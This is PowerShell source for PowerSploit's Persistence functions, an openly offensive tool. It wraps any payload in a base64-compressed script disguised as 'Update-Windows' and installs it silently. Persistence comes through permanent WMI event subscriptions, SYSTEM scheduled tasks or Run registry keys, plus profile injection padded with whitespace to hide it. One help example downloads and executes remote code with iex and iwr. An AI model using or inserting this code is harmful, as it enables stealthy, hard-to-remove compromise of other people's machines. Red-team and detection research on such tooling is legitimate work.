function New-ElevatedPersistenceOption
{
<#
.SYNOPSIS

    Configure elevated persistence options for the Add-Persistence function.

    PowerSploit Function: New-ElevatedPersistenceOption
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    New-ElevatedPersistenceOption allows for the configuration of elevated persistence options. The output of this function is a required parameter of Add-Persistence. Available persitence options in order of stealth are the following: permanent WMI subscription, scheduled task, and registry.

.PARAMETER PermanentWMI

    Persist via a permanent WMI event subscription. This option will be the most difficult to detect and remove.

    Detection Difficulty:        Difficult
    Removal Difficulty:          Difficult
    User Detectable?             No

.PARAMETER ScheduledTask

    Persist via a scheduled task.

    Detection Difficulty:        Moderate
    Removal Difficulty:          Moderate
    User Detectable?             No

.PARAMETER Registry

    Persist via the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. Note: This option will briefly pop up a PowerShell console to the user.

    Detection Difficulty:        Easy
    Removal Difficulty:          Easy
    User Detectable?             Yes

.PARAMETER AtLogon

    Starts the payload upon any user logon.

.PARAMETER AtStartup

    Starts the payload within 240 and 325 seconds of computer startup.

.PARAMETER OnIdle

    Starts the payload after one minute of idling.

.PARAMETER Daily

    Starts the payload daily.

.PARAMETER At

    Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.

.EXAMPLE

    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'

.EXAMPLE

    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup

.EXAMPLE

    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle

.LINK

    http://www.exploit-monday.com
#>

    [CmdletBinding()] Param (
        [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]
        [Switch]
        $PermanentWMI,

        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        $ScheduledTask,

        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        $Registry,

        [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Switch]
        $Daily,

        [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [DateTime]
        $At,

        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        $OnIdle,

        [Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]
        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        $AtLogon,

        [Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]
        [Switch]
        $AtStartup
    )

    $PersistenceOptionsTable = @{
        Method = ''
        Trigger = ''
        Time = ''
    }

    switch ($PSCmdlet.ParameterSetName)
    {
        'PermanentWMIAtStartup'
        {
            $PersistenceOptionsTable['Method'] = 'PermanentWMI'
            $PersistenceOptionsTable['Trigger'] = 'AtStartup'
        }

        'PermanentWMIDaily'
        {
            $PersistenceOptionsTable['Method'] = 'PermanentWMI'
            $PersistenceOptionsTable['Trigger'] = 'Daily'
            $PersistenceOptionsTable['Time'] = $At
        }

        'ScheduledTaskAtLogon'
        {
            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
            $PersistenceOptionsTable['Trigger'] = 'AtLogon'
        }

        'ScheduledTaskOnIdle'
        {
            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
            $PersistenceOptionsTable['Trigger'] = 'OnIdle'
        }

        'ScheduledTaskDaily'
        {
            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
            $PersistenceOptionsTable['Trigger'] = 'Daily'
            $PersistenceOptionsTable['Time'] = $At
        }

        'Registry'
        {
            $PersistenceOptionsTable['Method'] = 'Registry'
            $PersistenceOptionsTable['Trigger'] = 'AtLogon'
        }
    }

    $PersistenceOptions = New-Object -TypeName PSObject -Property $PersistenceOptionsTable
    $PersistenceOptions.PSObject.TypeNames[0] = 'PowerSploit.Persistence.ElevatedPersistenceOption'

    Write-Output $PersistenceOptions
}

function New-UserPersistenceOption
{
<#
.SYNOPSIS

    Configure user-level persistence options for the Add-Persistence function.

    PowerSploit Function: New-UserPersistenceOption
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    New-UserPersistenceOption allows for the configuration of elevated persistence options. The output of this function is a required parameter of Add-Persistence. Available persitence options in order of stealth are the following: scheduled task, registry.

.PARAMETER ScheduledTask

    Persist via a scheduled task.

    Detection Difficulty:        Moderate
    Removal Difficulty:          Moderate
    User Detectable?             No

.PARAMETER Registry

    Persist via the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. Note: This option will briefly pop up a PowerShell console to the user.

    Detection Difficulty:        Easy
    Removal Difficulty:          Easy
    User Detectable?             Yes

.PARAMETER AtLogon

    Starts the payload upon any user logon.

.PARAMETER OnIdle

    Starts the payload after one minute of idling.

.PARAMETER Daily

    Starts the payload daily.

.PARAMETER At

    Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.

.EXAMPLE

    C:\PS> $UserOptions = New-UserPersistenceOption -Registry -AtLogon

.EXAMPLE

    C:\PS> $UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle

.LINK

    http://www.exploit-monday.com
#>

    [CmdletBinding()] Param (
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        $ScheduledTask,

        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        $Registry,

        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Switch]
        $Daily,

        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [DateTime]
        $At,

        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        $OnIdle,

        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        $AtLogon
    )

    $PersistenceOptionsTable = @{
        Method = ''
        Trigger = ''
        Time = ''
    }

    switch ($PSCmdlet.ParameterSetName)
    {
        'ScheduledTaskAtLogon'
        {
            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
            $PersistenceOptionsTable['Trigger'] = 'AtLogon'
        }

        'ScheduledTaskOnIdle'
        {
            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
            $PersistenceOptionsTable['Trigger'] = 'OnIdle'
        }

        'ScheduledTaskDaily'
        {
            $PersistenceOptionsTable['Method'] = 'ScheduledTask'
            $PersistenceOptionsTable['Trigger'] = 'Daily'
            $PersistenceOptionsTable['Time'] = $At
        }

        'Registry'
        {
            $PersistenceOptionsTable['Method'] = 'Registry'
            $PersistenceOptionsTable['Trigger'] = 'AtLogon'
        }
    }

    $PersistenceOptions = New-Object -TypeName PSObject -Property $PersistenceOptionsTable
    $PersistenceOptions.PSObject.TypeNames[0] = 'PowerSploit.Persistence.UserPersistenceOption'

    Write-Output $PersistenceOptions
}

function Add-Persistence
{
<#
.SYNOPSIS

    Add persistence capabilities to a script.

    PowerSploit Function: Add-Persistence
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: New-ElevatedPersistenceOption, New-UserPersistenceOption
    Optional Dependencies: None
 
.DESCRIPTION

    Add-Persistence will add persistence capabilities to any script or scriptblock. This function will output both the newly created script with persistence capabilities as well a script that will remove a script after it has been persisted.

.PARAMETER ScriptBlock

    Specifies a scriptblock containing your payload.

.PARAMETER FilePath

    Specifies the path to your payload.

.PARAMETER ElevatedPersistenceOption

    Specifies the trigger for the persistent payload if the target is running elevated.
    You must run New-ElevatedPersistenceOption to generate this argument.

.PARAMETER UserPersistenceOption

    Specifies the trigger for the persistent payload if the target is not running elevated.
    You must run New-UserPersistenceOption to generate this argument.

.PARAMETER PersistenceScriptName

    Specifies the name of the function that will wrap the original payload. The default value is 'Update-Windows'.

.PARAMETER DoNotPersistImmediately

    Output only the wrapper function for the original payload. By default, Add-Persistence will output a script that will automatically attempt to persist (e.g. it will end with 'Update-Windows -Persist'). If you are in a position where you are running in memory but want to persist at a later time, use this option.

.PARAMETER PersistentScriptFilePath

    Specifies the path where you would like to output the persistence script. By default, Add-Persistence will write the removal script to 'Persistence.ps1' in the current directory.

.PARAMETER RemovalScriptFilePath

    Specifies the path where you would like to output a script that will remove the persistent payload. By default, Add-Persistence will write the removal script to 'RemovePersistence.ps1' in the current directory.

.PARAMETER PassThru

    Outputs the contents of the persistent script to the pipeline. This option is useful when you want to write the original persistent script to disk and pass the script to Out-EncodedCommand via the pipeline.

.INPUTS

    None

    Add-Persistence cannot receive any input from the pipeline.

.OUTPUTS

    System.Management.Automation.ScriptBlock

    If the '-PassThru' switch is provided, Add-Persistence will output a scriptblock containing the contents of the persistence script.

.NOTES

    When the persistent script executes, it will not generate any meaningful output as it was designed to run as silently as possible on the victim's machine.

.EXAMPLE

    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
    C:\PS>$UserOptions = New-UserPersistenceOption -Registry -AtLogon
    C:\PS>Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose

    Description
    -----------
    Creates a script containing the contents of EvilPayload.ps1 that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime.

.EXAMPLE

    C:\PS>$Rickroll = { iex (iwr http://bit.ly/e0Mw9w ) }
    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
    C:\PS>$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
    C:\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1

    Description
    -----------
    Creates a script containing the contents of the provided scriptblock that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime. The output is then passed through to Out-EncodedCommand so that it can be executed in a single command line statement. The final, encoded output is finally saved to .\EncodedPersistentScript.ps1

.LINK

    http://www.exploit-monday.com
#>

    [CmdletBinding()] Param (
        [Parameter( Mandatory = $True, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter( Mandatory = $True, ParameterSetName = 'FilePath' )]
        [ValidateNotNullOrEmpty()]
        [Alias('Path')]
        [String]
        $FilePath,

        [Parameter( Mandatory = $True )]
        $ElevatedPersistenceOption,

        [Parameter( Mandatory = $True )]
        $UserPersistenceOption,

        [ValidateNotNullOrEmpty()]
        [String]
        $PersistenceScriptName = 'Update-Windows',

        [ValidateNotNullOrEmpty()]
        [String]
        $PersistentScriptFilePath = "$PWD\Persistence.ps1",

        [ValidateNotNullOrEmpty()]
        [String]
        $RemovalScriptFilePath = "$PWD\RemovePersistence.ps1",

        [Switch]
        $DoNotPersistImmediately,

        [Switch]
        $PassThru
    )

    Set-StrictMode -Version 2

#region Validate arguments

    if ($ElevatedPersistenceOption.PSObject.TypeNames[0] -ne 'PowerSploit.Persistence.ElevatedPersistenceOption')
    {
        throw 'You provided invalid elevated persistence options.'
    }

    if ($UserPersistenceOption.PSObject.TypeNames[0] -ne 'PowerSploit.Persistence.UserPersistenceOption')
    {
        throw 'You provided invalid user-level persistence options.'
    }

    $Path = Split-Path $PersistentScriptFilePath -ErrorAction Stop
    $Leaf = Split-Path $PersistentScriptFilePath -Leaf -ErrorAction Stop
    $PersistentScriptFile = ''
    $RemovalScriptFile = ''

    if ($Path -eq '')
    {
        $PersistentScriptFile = "$($PWD)\$($Leaf)"
    }
    else
    {
        $PersistentScriptFile = "$($Path)\$($Leaf)"
    }

    $Path = Split-Path $RemovalScriptFilePath -ErrorAction Stop
    $Leaf = Split-Path $RemovalScriptFilePath -Leaf -ErrorAction Stop
    if ($Path -eq '')
    {
        $RemovalScriptFile = "$($PWD)\$($Leaf)"
    }
    else
    {
        $RemovalScriptFile = "$($Path)\$($Leaf)"
    }

    if ($PSBoundParameters['FilePath'])
    {
        Get-ChildItem $FilePath -ErrorAction Stop
        $Script = [IO.File]::ReadAllText((Resolve-Path $Path))
    }
    else
    {
        $Script = $ScriptBlock
    }

#endregion

#region Initialize data

    $CompressedScript = ''
    $UserTrigger = ''
    $UserTriggerRemoval = ''
    $ElevatedTrigger = "''"
    $ElevatedTriggerRemoval = ''
    $UserTrigger = "''"
    $UserTriggerRemoval = ''
    $CommandLine = ''

#endregion

#region Compress the original payload in preparation for the persistence script

    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($Script)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    # Generate the code that will decompress and execute the payload.
    # This code is intentionally ugly to save space.
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

#endregion

#region Process persistence options

    # Begin processing elevated persistence options
    switch ($ElevatedPersistenceOption.Method)
    {
        'PermanentWMI'
        {
            $ElevatedTriggerRemoval = {
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Updater'"| Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Updater'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match 'Updater'} | Remove-WmiObject
            }

            switch ($ElevatedPersistenceOption.Trigger)
            {
                'AtStartup'
                {
                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
                }

                'Daily'
                {
                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ElevatedPersistenceOption.Time.ToString('HH')) AND TargetInstance.Minute = $($ElevatedPersistenceOption.Time.ToString('mm')) GROUP WITHIN 60```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
                }

                default
                {
                    throw 'Invalid elevated persistence options provided!'
                }
            }
        }

        'ScheduledTask'
        {
            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
            $ElevatedTriggerRemoval = "schtasks /Delete /TN Updater"

            switch ($ElevatedPersistenceOption.Trigger)
            {
                'AtLogon'
                {
                    $ElevatedTrigger = "schtasks /Create /RU system /SC ONLOGON /TN Updater /TR "
                }
                
                'Daily'
                {
                    $ElevatedTrigger = "schtasks /Create /RU system /SC DAILY /ST $($ElevatedPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
                }

                'OnIdle'
                {
                    $ElevatedTrigger = "schtasks /Create /RU system /SC ONIDLE /I 1 /TN Updater /TR "
                }

                default
                {
                    throw 'Invalid elevated persistence options provided!'
                }
            }

            $ElevatedTrigger = '"' + $ElevatedTrigger + $CommandLine + '"'
        }

        'Registry'
        {
            $ElevatedTrigger = "New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "
            $ElevatedTriggerRemoval = "Remove-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater"
            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden`""
            $ElevatedTrigger = "'" + $ElevatedTrigger + $CommandLine + "'"
        }

        default
        {
            throw 'Invalid elevated persistence options provided!'
        }
    }

    # Begin processing user-level persistence options
    switch ($UserPersistenceOption.Method)
    {
        'ScheduledTask'
        {
            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
            $UserTriggerRemoval = "schtasks /Delete /TN Updater"

            switch ($UserPersistenceOption.Trigger)
            {
                'Daily'
                {
                    $UserTrigger = "schtasks /Create /SC DAILY /ST $($UserPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
                }

                'OnIdle'
                {
                    $UserTrigger = "schtasks /Create /SC ONIDLE /I 1 /TN Updater /TR "
                }

                default
                {
                    throw 'Invalid user-level persistence options provided!'
                }
            }

            $UserTrigger = '"' + $UserTrigger + $CommandLine + '"'
        }

        'Registry'
        {
            $UserTrigger = "New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "
            $UserTriggerRemoval = "Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater"
            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden`""
            $UserTrigger = "'" + $UserTrigger + $CommandLine + "'"
        }

        default
        {
            throw 'Invalid user-level persistence options provided!'
        }
    }

#endregion

#region Original script with its persistence logic will reside here

# This is intentionally ugly in the interest of saving space on the victim machine.
$PersistantScript = {
function FUNCTIONNAME{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={ORIGINALSCRIPT}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload=ELEVATEDTRIGGER}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload=USERTRIGGER}
' '*600+$Script.ToString()|Out-File $Prof -A -NoC -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} EXECUTEFUNCTION

}

    $PersistantScript = $PersistantScript.ToString().Replace('FUNCTIONNAME', $PersistenceScriptName)
    $PersistantScript = $PersistantScript.ToString().Replace('ORIGINALSCRIPT', $NewScript)
    $PersistantScript = $PersistantScript.ToString().Replace('ELEVATEDTRIGGER', $ElevatedTrigger)
    $PersistantScript = $PersistantScript.ToString().Replace('USERTRIGGER', $UserTrigger)

    if ($DoNotPersistImmediately)
    {
        $PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', '')
    }
    else
    {
        $PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', "$PersistenceScriptName -Persist")
    }

#endregion

#region Generate final output

# Generate the persistence removal script
$PersistenceRemoval = @"
# Execute the following to remove the elevated persistent payload
$ElevatedTriggerRemoval
# Execute the following to remove the user-level persistent payload
$UserTriggerRemoval
"@

    
    $PersistantScript | Out-File $PersistentScriptFile
    Write-Verbose "Persistence script written to $PersistentScriptFile"

    $PersistenceRemoval | Out-File $RemovalScriptFile
    Write-Verbose "Persistence removal script written to $RemovalScriptFile"

    if ($PassThru)
    {
        # Output a scriptblock of the persistent function. This can be passed to Out-EncodedCommand via the pipeline.
        Write-Output ([ScriptBlock]::Create($PersistantScript))
    }

#endregion
}